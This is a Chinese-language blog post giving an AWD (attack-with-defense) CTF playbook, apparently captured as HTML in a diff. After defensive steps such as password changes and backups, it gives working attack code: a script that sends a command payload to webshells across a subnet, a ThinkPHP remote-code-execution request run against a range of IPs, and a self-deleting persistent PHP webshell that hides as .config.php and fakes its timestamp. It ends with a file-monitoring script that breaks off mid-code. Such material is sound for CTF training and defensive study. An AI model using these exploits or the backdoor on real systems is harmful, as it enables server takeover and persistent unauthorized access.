@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="AWD附上AWD基操 1、确定环境是密码登录还是密钥登录密钥登录：（比赛方会提供如下三个文件） id_rsa id_rsa.pub token.txt 文件导入即可 若为密码登录，则看密码是否为随机的哈希值，并推测全场密码是否一样，若一样则首先需要修改密码，避免对方写批量遍历脚本，遍历所有服务器，当可以登录时，就瞬间修改你的机子，然后你就什么都做不了，服务器都落到对方手中，除非重置机子。 修改密码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="V&#39;s blog">
+<meta property="og:url" content="http://yoursite.com/2019/08/02/AWD/index.html">
+<meta property="og:site_name" content="V&#39;s blog">
+<meta property="og:description" content="AWD附上AWD基操 1、确定环境是密码登录还是密钥登录密钥登录：（比赛方会提供如下三个文件） id_rsa id_rsa.pub token.txt 文件导入即可 若为密码登录，则看密码是否为随机的哈希值，并推测全场密码是否一样，若一样则首先需要修改密码，避免对方写批量遍历脚本，遍历所有服务器，当可以登录时，就瞬间修改你的机子，然后你就什么都做不了，服务器都落到对方手中，除非重置机子。 修改密码">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-07-24T01:29:09.597Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="V&#39;s blog">
+<meta name="twitter:description" content="AWD附上AWD基操 1、确定环境是密码登录还是密钥登录密钥登录：（比赛方会提供如下三个文件） id_rsa id_rsa.pub token.txt 文件导入即可 若为密码登录，则看密码是否为随机的哈希值，并推测全场密码是否一样，若一样则首先需要修改密码，避免对方写批量遍历脚本，遍历所有服务器，当可以登录时，就瞬间修改你的机子，然后你就什么都做不了，服务器都落到对方手中，除非重置机子。 修改密码">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/08/02/AWD/">
+
+
+
+
+
+  <title> | V's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">V's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Daily life of a rookie</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/02/AWD/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="V">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="V's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline"></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-02T12:48:30+08:00">
+                2019-08-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h3><p>附上AWD基操</p>
+<h4 id="1、确定环境是密码登录还是密钥登录"><a href="#1、确定环境是密码登录还是密钥登录" class="headerlink" title="1、确定环境是密码登录还是密钥登录"></a>1、确定环境是密码登录还是密钥登录</h4><p>密钥登录：（比赛方会提供如下三个文件）</p>
+<p>id_rsa</p>
+<p>id_rsa.pub</p>
+<p>token.txt</p>
+<p>文件导入即可</p>
+<p>若为密码登录，则看密码是否为随机的哈希值，并推测全场密码是否一样，若一样则首先需要修改密码，避免对方写批量遍历脚本，遍历所有服务器，当可以登录时，就瞬间修改你的机子，然后你就什么都做不了，服务器都落到对方手中，除非重置机子。</p>
+<p>修改密码：</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">passwd 用户名    <span class="comment">//linux命令</span></span><br><span class="line"></span><br><span class="line">​					passwd ubuntu sudo passwd root   <span class="comment">//ubuntu命令： </span></span><br><span class="line"></span><br><span class="line">​					<span class="keyword">w</span>   <span class="comment">//查看当前登录的用户 </span></span><br><span class="line"></span><br><span class="line">​					<span class="keyword">kill</span> -<span class="keyword">kill</span> -t 用户的tty   <span class="comment">//踢掉当前登录的用户</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2、迅速备份源码和数据库到本机"><a href="#2、迅速备份源码和数据库到本机" class="headerlink" title="2、迅速备份源码和数据库到本机"></a>2、迅速备份源码和数据库到本机</h4><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/<span class="regexp">/这里假定web目录为/var</span><span class="regexp">/www/html</span></span><br><span class="line">mkdir -p ~<span class="regexp">/beifen</span></span><br><span class="line"><span class="regexp">cp -ra /var</span><span class="regexp">/www/html</span><span class="regexp">/. ~/beifen</span></span><br><span class="line">其中~代表用户的家目录，-r是递归，-a是保留原来文件属性， .是代表所有文件（不用*，因为*无法表示所有文件）</span><br></pre></td></tr></table></figure>
+
+<p>定时备份源码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> [ 1 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">time=`/bin/date +%H-%M-%S`</span><br><span class="line">bak_file=<span class="string">"/var/www/<span class="variable">$time</span>.tar.gz"</span></span><br><span class="line">webdir=<span class="string">"/var/www/html"</span></span><br><span class="line">tar zcvf <span class="variable">$bak_file</span> <span class="variable">$webdir</span> &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">sleep 60                               //一分钟备份一次</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3、找配置文件-amp-mysql一些操作"><a href="#3、找配置文件-amp-mysql一些操作" class="headerlink" title="3、找配置文件&amp;mysql一些操作"></a>3、找配置文件&amp;mysql一些操作</h4><p>找配置文件，找文件名有con、config、db字样的。在刚才备份的文件那里可以使用linux命令</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> . -<span class="built_in">name</span> <span class="string">'*name*'</span></span><br></pre></td></tr></table></figure>
+
+<p>找到这些文件后，最主要找一些账号密码，例如mysql账号密码，如果找到了，自己可以修改自己服务器上的mysql密码，命令如下：（先自己登陆进去）</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; update<span class="built_in"> user </span><span class="builtin-name">set</span> <span class="attribute">password</span>=PASSWORD("新的密码") where <span class="attribute">user</span>=<span class="string">'root'</span>; </span><br><span class="line">mysql&gt; flush privileges; (刷新)</span><br><span class="line">mysql&gt; exit</span><br></pre></td></tr></table></figure>
+
+<p>记得修改了mysql密码后，还要把刚才找到的配置文件的密码给修改了，不然你的web服务就会不正常。</p>
+<p>得到mysql密码，一般来说你就可以看看你自己mysql数据库里的数据，一般来说别人的数据库记录也是如此，所以别人一些后台账号密码，你都可以找到的（如果里面入库是不经过哈希处理的）</p>
+<p>另外，也多注意有什么别的配置文件。</p>
+<p>备份数据库</p>
+<p>​        </p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mysql备份指定数据库 </span></span><br><span class="line">mysqldump -u 用户名 -<span class="selector-tag">p</span> 密码 数据库名 &gt; back<span class="selector-class">.sql</span> </span><br><span class="line"><span class="comment">//mysql备份所有数据库 </span></span><br><span class="line">mysqldump --all-databases &gt; bak<span class="selector-class">.sql</span> </span><br><span class="line"><span class="comment">//还原mysql数据库 </span></span><br><span class="line">mysql -u 用户名 -<span class="selector-tag">p</span> 密码 数据库名 &lt; bak.sql</span><br></pre></td></tr></table></figure>
+
+<p>D盾查杀，然后利用</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-<span class="number">8</span></span><br><span class="line">import requests</span><br><span class="line">url_head=<span class="string">"http://xxx.xx.xxx."</span>	#网段</span><br><span class="line">url=<span class="string">""</span></span><br><span class="line">shell_addr=<span class="string">"/Upload/index.php"</span></span><br><span class="line">【passwd=<span class="string">"xxxxx"</span>】					#木马密码</span><br><span class="line">port=<span class="string">"80"</span></span><br><span class="line">【payload =  &#123;passwd: <span class="string">'system(\'</span><span class="keyword">cat</span> /flag\<span class="string">');'</span>&#125;】</span><br><span class="line"></span><br><span class="line">webshelllist=<span class="keyword">open</span>(<span class="string">"webshelllist.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line">flag=<span class="keyword">open</span>(<span class="string">"firstround_flag.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">30</span>,<span class="number">61</span>):</span><br><span class="line">	url=url_head+str(i)+<span class="string">":"</span>+port+shell_addr</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">res</span>=requests.post(url,payload,timeout=<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">res</span>.status_code == requests.codes.ok:</span><br><span class="line">			result = url+<span class="string">" connect shell sucess,flag is "</span>+<span class="keyword">res</span>.text</span><br><span class="line">			<span class="keyword">print</span> result</span><br><span class="line">			<span class="keyword">print</span> &gt;&gt;flag,result</span><br><span class="line">			<span class="keyword">print</span> &gt;&gt;webshelllist,url+<span class="string">","</span>+passwd</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"shell 404"</span></span><br><span class="line">	excep<span class="variable">t:</span></span><br><span class="line">		<span class="keyword">print</span> url+<span class="string">" connect shell fail"</span></span><br><span class="line"></span><br><span class="line">webshelllist.<span class="keyword">close</span>()</span><br><span class="line">flag.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure>
+
+<p>第二步，上waf</p>
+<p>初始部署，deployeerything.py一把梭</p>
+<p>第三步，批量割韭菜，批量flag的提交。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readWebcamera</span><span class="params">(ip=<span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(<span class="string">'http://'</span> + ip + <span class="string">'/index?s=index/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag.txt'</span>)</span><br><span class="line">        <span class="comment">#passwd="xxxxx"</span></span><br><span class="line">        <span class="comment">#url='http://' + ip + '/Upload/index.php</span></span><br><span class="line">        <span class="comment">#payload =  &#123;passwd: 'system(\'cat /flag\');'&#125;</span></span><br><span class="line">        <span class="comment">#res=requests.post(url,payload,timeout=1)</span></span><br><span class="line">        <span class="keyword">if</span> res.status_code == requests.codes.ok: </span><br><span class="line">            print(ip,end=<span class="string">":"</span>)</span><br><span class="line">            print(res.text)</span><br><span class="line">            <span class="comment">#sub = requests.post('http://192.168.4.1',data=&#123;'ip':ip,'flag'=res.text&#125;)</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">101</span>, <span class="number">119</span>):</span><br><span class="line">    readWebcamera(<span class="string">"172.20."</span> + str(i) + <span class="string">".102"</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="附加"><a href="#附加" class="headerlink" title="附加"></a>附加</h3><p>不死马</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	set_time_limit(<span class="number">0</span>);</span><br><span class="line">	ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">	unlink(__FILE__);</span><br><span class="line">	while(<span class="number">1</span>)&#123;</span><br><span class="line">		file_put_contents('./.config.php', '&lt;?php eval($_POST['cmd']);?&gt;');</span><br><span class="line">		system('chmod <span class="number">777</span> .config.php');					</span><br><span class="line">		<span class="comment">//持续在config.php中写入</span></span><br><span class="line">		<span class="section">touch</span>(<span class="string">"./.config.php"</span>, mktime(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">17</span>,<span class="number">2017</span>));	</span><br><span class="line">		usleep(<span class="number">100</span>);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文件监控</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#use: python file_check.py ./</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> ntpath</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = &#123;&#125;      <span class="comment"># 文件MD5字典</span></span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 特殊文件路径字符串</span></span><br><span class="line">Special_path_str = <span class="string">'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'</span></span><br><span class="line">bakstring = <span class="string">'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'</span></span><br><span class="line">logstring = <span class="string">'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span></span><br><span class="line">webshellstring = <span class="string">'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span></span><br><span class="line">difffile = <span class="string">'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'</span></span><br><span class="line"></span><br><span class="line">Special_string = <span class="string">'drops_log'</span>  <span class="comment"># 免死金牌</span></span><br><span class="line">UNICODE_ENCODING = <span class="string">"utf-8"</span></span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = <span class="string">r"\?%02x"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件路径字典</span></span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</span><br><span class="line">Special_path = &#123;</span><br><span class="line">    <span class="string">'bak'</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),</span><br><span class="line">    <span class="string">'log'</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),</span><br><span class="line">    <span class="string">'webshell'</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</span><br><span class="line">    <span class="string">'difffile'</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isListLike</span><span class="params">(value)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> isinstance(value, (list, tuple, set))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取Unicode编码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUnicode</span><span class="params">(value, encoding=None, noneToNull=False)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> noneToNull <span class="keyword">and</span> value <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> NULL</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isListLike(value):</span><br><span class="line">        value = list(getUnicode(_, encoding, noneToNull) <span class="keyword">for</span> _ <span class="keyword">in</span> value)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isinstance(value, unicode):</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">elif</span> isinstance(value, basestring):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unicode(value, encoding <span class="keyword">or</span> UNICODE_ENCODING)</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError, ex:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">return</span> unicode(value, UNICODE_ENCODING)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    value = value[:ex.start] + <span class="string">""</span>.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) <span class="keyword">for</span> _ <span class="keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> unicode(value)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> unicode(str(value), errors=<span class="string">"ignore"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目录创建</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir_p</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> errno</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="keyword">if</span> exc.errno == errno.EEXIST <span class="keyword">and</span> os.path.isdir(path):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前所有文件路径</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilelist</span><span class="params">(cwd)</span>:</span></span><br><span class="line">    filelist = []</span><br><span class="line">    <span class="keyword">for</span> root,subdirs, files <span class="keyword">in</span> os.walk(cwd):</span><br><span class="line">        <span class="keyword">for</span> filepath <span class="keyword">in</span> files:</span><br><span class="line">            originalfile = os.path.join(root, filepath)</span><br><span class="line">            <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> originalfile:</span><br><span class="line">                filelist.append(originalfile)</span><br><span class="line">    <span class="keyword">return</span> filelist</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算机文件MD5值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcMD5</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(filepath,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            md5obj = hashlib.md5()</span><br><span class="line">            md5obj.update(f.read())</span><br><span class="line">            hash = md5obj.hexdigest()</span><br><span class="line">            <span class="keyword">return</span> hash</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'[!] getmd5_error : '</span> + getUnicode(filepath)</span><br><span class="line">        <span class="keyword">print</span> getUnicode(e)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ORIGIN_FILE_LIST.remove(filepath)</span><br><span class="line">            FILE_MD5_DICT.pop(filepath, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">except</span> KeyError, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有文件MD5</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 